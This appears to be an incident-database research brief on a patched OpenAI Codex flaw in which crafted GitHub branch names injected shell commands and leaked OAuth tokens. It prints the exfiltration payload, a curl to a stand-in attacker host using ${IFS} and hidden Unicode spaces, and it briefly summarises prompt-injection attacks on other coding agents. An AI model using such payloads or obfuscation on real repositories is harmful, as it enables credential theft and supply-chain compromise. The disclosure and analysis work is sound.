# AAGF-2026-029 Research: OpenAI Codex GitHub OAuth Token Exposure + Branch Name Injection

**Subject:** OpenAI Codex Command Injection via Branch Name — GitHub OAuth Token Exfiltration
**Primary sources:** BeyondTrust Phantom Labs (original researcher), SecurityWeek, The Hacker News, SC Media, VentureBeat
**Researcher:** Claude (automated deep research)
**Date researched:** 2026-05-05
**Suggested ID:** AAGF-2026-029

---

## Source Inventory

| Source | URL | Type | Credibility | Notes |
|--------|-----|------|-------------|-------|
| BeyondTrust Phantom Labs blog | https://www.beyondtrust.com/blog/entry/openai-codex-command-injection-vulnerability-github-token | Primary — disclosing researcher | High | Original technical disclosure. Published March 30, 2026. Returned 403 during fetch; content reconstructed from secondary sources citing it. |
| SecurityWeek | https://www.securityweek.com/critical-vulnerability-in-openai-codex-allowed-github-token-compromise/ | Independent security journalism | High | Detailed technical coverage with researcher quotes. Published ~March 31, 2026. |
| The Hacker News | https://thehackernews.com/2026/03/openai-patches-chatgpt-data.html | Independent security journalism | High | Covers both the Codex vulnerability and simultaneous ChatGPT data exfiltration patch. Published March 2026. |
| SC Media | https://www.scworld.com/news/openai-fixes-codex-flaw-that-could-lead-to-github-token-theft | Independent security journalism | High | Returned 403; cited by searches. |
| VentureBeat | https://venturebeat.com/security/six-exploits-broke-ai-coding-agents-iam-never-saw-them | Independent technology journalism | High | Contextualizes Codex flaw within a broader nine-month pattern of six AI coding agent exploits. Published ~early May 2026. |
| Barrack.ai blog | https://blog.barrack.ai/openai-codex-command-injection-github-token/ | Technical analysis blog | Medium-High | Rich technical detail on payload mechanics, IFS bypass, and token exfiltration flow. |
| Vibe Graveyard | https://vibegraveyard.ai/story/openai-codex-command-injection-github-token-theft/ | Secondary news aggregator | Medium-High | Detailed technical walkthrough corroborating BeyondTrust findings. |
| BankInfoSecurity | https://www.bankinfosecurity.com/openais-coding-agent-flaw-exposed-github-passwords-a-31273 | Independent security journalism | High | Researcher quote sourced directly. |
| SiliconANGLE | https://siliconangle.com/2026/03/30/openai-codex-vulnerability-enabled-github-token-theft-via-command-injection-report-finds/ | Independent tech journalism | High | Published day of disclosure (March 30, 2026). Confirmed all four remediation phases. |
| Hackread | https://hackread.com/openai-codex-vulnerability-steal-github-tokens/ | Independent security journalism | Medium-High | Corroborates mechanism and timeline. |
| MrCloudBook | https://mrcloudbook.com/cve-2026-openai-codex-github-token-theft-command-injection-via-branch-name-explained/ | Technical blog | Low-Medium | Title references "CVE-2026" but no official CVE was assigned — headline is misleading. Use with caution. |
| Softtechhub | https://softtechhub.us/2026/04/30/codex-claude-code-and-copilot-breached/ | Secondary tech blog | Medium | Aggregates VentureBeat six-exploit framing. |

**Source quality summary:** Strong across independent outlets. The primary source (BeyondTrust blog) was inaccessible due to 403 during fetch, but its content is extensively quoted and paraphrased across at least eight independent secondary sources with consistent technical detail. SecurityWeek, The Hacker News, and SC Media are tier-1 independent security journalism. No material contradictions found across sources.

---

## Source Bias Flag

- **Disclosing researcher bias:** BeyondTrust Phantom Labs is both the discoverer and the primary technical source. As an identity/security vendor, they have commercial interest in publicizing credential management vulnerabilities. The technical claims appear credible (corroborated by independent outlets, OpenAI's Critical P1 classification confirms severity), but the framing of risk and impact language should be treated as potentially amplified.
- **Quantitative claims:** No specific user counts, revenue impact figures, or exploitation statistics appear in the sources. The claim that the attack "could be automated to compromise multiple users interacting with a shared repository" is a proof-of-concept extrapolation, not a confirmed exploitation metric.
- **"CVE-2026" headline:** The MrCloudBook article title implies a CVE was assigned; no official CVE number appears in any credible source, including SecurityWeek and The Hacker News. This appears to be a clickbait misrepresentation. **No CVE was assigned.**
- **No confirmed exploitation:** All sources explicitly note the flaw was never observed exploited in the wild. Impact is potential, not confirmed.

---

## Key Facts

| Field | Value |
|-------|-------|
| **date_occurred** | No earlier than late 2024 (when Codex cloud launched with GitHub OAuth integration); vulnerability existed through at least December 16, 2025 |
| **date_discovered** | December 16, 2025 (BeyondTrust Phantom Labs internal discovery date, per disclosure timeline) |
| **date_reported** | December 16, 2025 (reported to OpenAI via BugCrowd on this date) |
| **date_first_public_disclosure** | March 30, 2026 (BeyondTrust blog post; simultaneous coverage in SiliconANGLE, SecurityWeek, The Hacker News) |
| **CVE** | None assigned |
| **Bug bounty program** | BugCrowd (OpenAI's bug bounty platform) |
| **Discoverers** | Tyler Jespersen (Security Researcher), Simon Stewart (Staff Security Researcher), Fletcher Davis (Director of Research) — all BeyondTrust Phantom Labs |
| **Vendor classification** | Critical, Priority 1 (P1) |
| **Patch status** | Fully remediated as of February 5, 2026 (server-side fixes; no user action required) |
| **Confirmed exploitation** | None — proof-of-concept only |

---

## Vulnerability Mechanism

### Root Cause

CWE-78: OS Command Injection. OpenAI Codex accepted a GitHub branch name as a user-controlled parameter via an HTTP POST to the Codex backend API (task creation endpoint) and passed it unsanitized into shell commands executed during container initialization.

### How Branch Names Flowed Into Setup Scripts

When a user submitted a task to Codex against a GitHub repository, Codex:

1. Received the branch name as part of the task creation HTTP POST request
2. Spun up a managed container environment
3. Cloned the repository during container setup using a GitHub OAuth token embedded directly in the git remote URL in the format: `https://oauth-token@github.com/owner/repo.git`
4. Passed the branch name parameter into shell commands (specifically `git fetch` / `git checkout` operations) without sanitization or escaping

The unsanitized branch name was interpreted by Bash literally, allowing shell metacharacters to escape the git command context.

### How the OAuth Token Was Embedded in the Git Remote URL

During the container setup phase, the GitHub OAuth token was embedded in the HTTPS remote URL as a credential prefix: `https://<oauth-token>@github.com/owner/repo.git`. This is a standard (if security-unfriendly) git authentication pattern. The token remained live and accessible in this URL throughout the initialization phase. It was removable by the Codex agent phase, but exploitable during setup.

The token could be extracted with: `git remote get-url origin`, which returned the cleartext credential including the OAuth token.

### Payload Construction

**Basic payload:**
```
main; curl${IFS}'https://attacker.com/exfil?token='`git${IFS}-C${IFS}/workspace/REPO${IFS}remote${IFS}get-url${IFS}origin`
```

Two bypass techniques were required:

1. **`${IFS}` space substitution:** GitHub's branch naming validation blocked literal spaces. The Internal Field Separator shell variable `${IFS}` evaluates to a space at runtime, bypassing GitHub's validation while executing correctly in Bash.

2. **Unicode ideographic space obfuscation:** To hide the malicious payload from users in the Codex web portal UI, researchers appended 94 Ideographic Space characters (Unicode U+3000) after "main", followed by `|| true`, then the malicious payload. The UI displayed only "main" — the payload was invisible — while the shell executed the full string.

**Result:** The full exfiltration payload appeared to any developer browsing the repository as a normal "main" branch.

### Attack Variants

**Variant 1 — Manual (user must be deceived):** Attacker creates malicious branch in a repository they control, shares the repository/branch with a victim. Victim runs a Codex task against that branch.

**Variant 2 — Automated (no additional user interaction):** Attacker with repository write access sets the malicious branch as the *default branch* via GitHub's API. Any user who subsequently points Codex at that repository has their token silently exfiltrated. Could be weaponized at scale against public or semi-public repositories with many contributors.

**Variant 3 — `@codex` code review path:** Referencing `@codex` in a GitHub pull request comment triggered a *code review container* that cloned at the specified (malicious) branch. This variant exfiltrated **GitHub Installation Access Tokens** rather than user OAuth tokens — credentials potentially carrying organization-wide repository permissions, not just single-user scope.

### CLI Credential Storage Side-Issue

A related finding: Codex CLI stored credentials in plaintext in `~/.codex/auth.json` (Unix) or `%USERPROFILE%\.codex\auth.json` (Windows), containing OpenAI API keys, access tokens, refresh tokens, and account identifiers. The CLI fell back to plaintext when the OS keyring was unavailable. This is a separate credential management weakness from the branch injection but discovered as part of the same research.

---

## Vendor Response

### Timeline

| Date | Event |
|------|-------|
| December 16, 2025 | BeyondTrust Phantom Labs reports to OpenAI via BugCrowd |
| ~December 23, 2025 | OpenAI deploys initial hotfix (approximately one week after report) |
| January 30, 2026 | Stronger shell escaping protections deployed; input validation strengthened; token scope and lifetime reduced during task execution |
| February 5, 2026 | Full remediation confirmed; OpenAI formally classifies as Critical Priority 1 (P1) |
| March 30, 2026 | BeyondTrust publishes public disclosure (3.5-month responsible disclosure window) |

### Remediation Phases (Four Total)

1. **Phase 1 (~Dec 23, 2025):** Initial input validation hotfix
2. **Phase 2 (~Jan 2026):** Shell escaping with proper quoting applied to branch parameter
3. **Phase 3 (~Jan 30, 2026):** Token exposure controls — reduced visibility of OAuth token in git remote URL during container lifetime
4. **Phase 4 (Feb 5, 2026):** Reduced token scope and lifetime during task execution; full remediation confirmed

All fixes were server-side. No user action, patch download, or version update was required for any affected product.

### Communication

OpenAI classified the vulnerability Critical P1 — the highest internal severity tier — and responded within one week with an initial fix. The 3.5-month responsible disclosure window was honored; OpenAI did not push back on disclosure timing. No public advisory or security bulletin was issued by OpenAI separate from the BeyondTrust disclosure; OpenAI's response is confirmed only through BeyondTrust's timeline.

---

## Impact Assessment

### Affected Products

- OpenAI Codex (ChatGPT website interface)
- Codex CLI
- Codex SDK
- Codex IDE Extension

### Token Scope and Access

The stolen GitHub User Access Tokens carried whatever repository permissions the developer had authorized for the ChatGPT Codex Connector GitHub application:
- Read/write access to authorized repositories
- Workflow and GitHub Actions access
- Issue and pull request access
- For organization accounts: potentially read/write across the organization's entire codebase

The `@codex` PR review variant yielded GitHub Installation Access Tokens, which could carry organization-wide scope — a more severe credential type.

### Potential Impact

- Read/write access to private source code repositories
- Injection of malicious code into repositories via the stolen token
- Lateral movement through organizational GitHub environments
- Theft of secrets committed to repositories (API keys, credentials, infrastructure configs)
- Supply chain attack surface if the compromised developer maintained public packages

### Confirmed Exploitation

**None.** All sources explicitly state no evidence of malicious exploitation was ever observed. The flaw was discovered, disclosed, and patched through responsible disclosure. The risk was potential, not realized.

---

## Relationship to Other Incidents

### AAGF-2026-016: IDEsaster

**Distinct but thematically related.** IDEsaster (Ari Marzouk / MaccariTA, December 2025) targeted AI-assisted IDEs — Cursor, Windsurf, Copilot, Kiro.dev, Zed.dev, Roo Code, Cline, Claude Code — through prompt injection attacks that weaponized legitimate IDE features (workspace config files, MCP configurations). 30+ vulnerabilities, 24 CVEs.

The Codex branch injection is **not** an IDEsaster vulnerability. IDEsaster attacks the IDE/editor layer via prompt injection; the Codex branch injection attacks the cloud agent's container setup via unsanitized OS command input. Both reflect the same underlying architectural failure (AI agents accumulating credentials without hardened input handling), but through different attack surfaces and mechanisms.

### VentureBeat "Six Exploits" Framing (Published ~May 2026)

The VentureBeat article "AI coding agents breached: attackers targeted credentials, not models" synthesized six research disclosures against AI coding agents over a nine-month period. The Codex branch injection is one of the six. The others reported include:

1. **Codex OAuth Token Theft** (BeyondTrust, March 30, 2026) — this incident
2. **Claude Code Source Code Leak / Deny Rule Bypass** (npm registry leak + Adversa research; ~April 2026)
3. **GitHub Copilot in Codespaces Takeover** (Orca Security; symbolic link to user-secrets-envs.json via GitHub issue prompt injection; exploited GITHUB_TOKEN)
4. **Copilot Auto-Approve Settings Attack** (hidden PR instructions overriding `.vscode/settings.json`; patched Microsoft August 2025 Patch Tuesday)
5. **Vertex AI Excessive Permissions** (Unit 42 / Ofir Shaty; default Google P4SA service identity granted unrestricted Cloud Storage and Artifact Registry access)
6. **A sixth exploit** (not fully identified in available source material — may be IDEsaster or another Copilot variant)

**Common pattern identified by VentureBeat:** Every exploit targeted the credential the agent was holding at runtime — not the AI model. Every compromised credential was one IAM tools never tracked because it existed only for the duration of an agent session.

### Relationship to Any Existing AAGF-2026-035 "Codex"

The research brief mentions checking "AAGF-2026-035 (Codex if it's the same)." Based on the sequential numbering of the drafts directory (highest found is AAGF-2026-027), AAGF-2026-035 does not yet appear to exist in the database. This incident (AAGF-2026-029) should be the canonical Codex branch injection entry.

---

## Classification Notes

### Triage Criteria Assessment

| Criterion | Assessment |
|-----------|------------|
| Real-world deployment | YES — OpenAI Codex is a production cloud service used by paying developers |
| Autonomous agent involved | YES — Codex is a cloud-based autonomous software engineering agent that executes tasks without human oversight of each step |
| Verifiable | YES — Tier-1 security press (SecurityWeek, Hacker News, SC Media), BeyondTrust primary disclosure, OpenAI's Critical P1 classification |
| Meaningful impact | YES — Full GitHub repository read/write access, potential supply chain risk; org-wide scope via `@codex` variant |

**Verdict: PUBLISH**

### Severity Estimate

**High** (not Critical, because no confirmed exploitation and short-lived tokens limited real-world window).

CVSS-adjacent reasoning:
- Attack Vector: Network
- Attack Complexity: Low (once branch exists; requires write access to create branch)
- Privileges Required: Low (repository write access)
- User Interaction: Required (victim must run Codex against malicious branch)
- Scope: Changed
- Confidentiality Impact: High (full repo contents + token)
- Integrity Impact: High (write access to repos via stolen token)
- Availability: None

### Proposed Categories

- `credential-theft` (primary)
- `command-injection`
- `supply-chain-risk`
- `ai-coding-agent`

### ATLAS Techniques (Candidate)

- **AML.T0048**: External Harms — via credential misuse post-theft
- **AML.T0051**: LLM Plugin Compromise — Codex uses GitHub plugin/connector
- **AML.T0052**: Prompt Injection — adjacent; the branch name is an injection of executable content into an agent's operating context (though technically OS-level, not LLM-level)
- **AML.T0010**: ML Supply Chain Compromise — if stolen tokens used to inject malicious code into repositories

The most precise framing is **OS command injection against an AI agent's container initialization environment**, exploiting the agent's credential-holding pattern. This is infrastructure-layer exploitation, not model-layer.

---

## Raw Notes / Quotes

**Tyler Jespersen (BeyondTrust Phantom Labs, Security Researcher)**, via BankInfoSecurity:
> "Input validation can affect AI agents just as much as prompt injection."
> "AI coding agents are not just productivity tools. They are live execution environments with access to sensitive credentials and organizational resources."

**BeyondTrust Phantom Labs report**, widely cited:
> "AI coding agents are not just productivity tools. They are live execution environments with access to sensitive credentials and organizational resources."

**Tyler Jespersen**, via SecurityWeek (on the vulnerability mechanism):
> The weakness existed "within the task creation HTTP request, which allows an attacker to smuggle arbitrary commands through the GitHub branch name parameter."

**VentureBeat synthesis**, on the broader pattern:
> "Six research teams disclosed exploits against Codex, Claude Code, Copilot, and Vertex AI over a nine-month period, and every exploit followed the same pattern: An AI coding agent held a credential, executed an action, and authenticated to a production system without a human session anchoring the request."
> "Every attack hit runtime credentials that IAM tools never tracked."

**Vibe Graveyard / synthesized from BeyondTrust**:
> "The vulnerability isn't in the AI model itself, but in the infrastructure wrapped around it."
> "AI coding agents... accumulate privileges (filesystem access, shell access, credentials, API keys, cloud tokens) at startup velocity, widening attack surfaces using decades-old input-handling shortcuts."

**On the Unicode obfuscation technique** (multiple sources):
> "A developer sees 'main.' The shell sees curl exfiltrating their token."

---

## Recommended Draft Angle

This incident sits at the intersection of two classic vulnerability classes (OS command injection + credential-in-URL anti-pattern) applied to a novel context (AI cloud coding agent with broad OAuth access). The story is not "AI did something weird" — it is "a web-connected autonomous agent inherited a decade-old git authentication pattern, never sanitized its shell inputs, and held credentials far too broadly scoped for the task at hand." The `@codex` PR review variant (org-wide Installation Access Token) deserves emphasis as the more severe attack path. The broader VentureBeat "six exploits" context should be referenced to place this in the pattern of agent credential mismanagement across the industry.

---

*Research complete. Sufficient material available for full draft. Recommend PUBLISH status.*
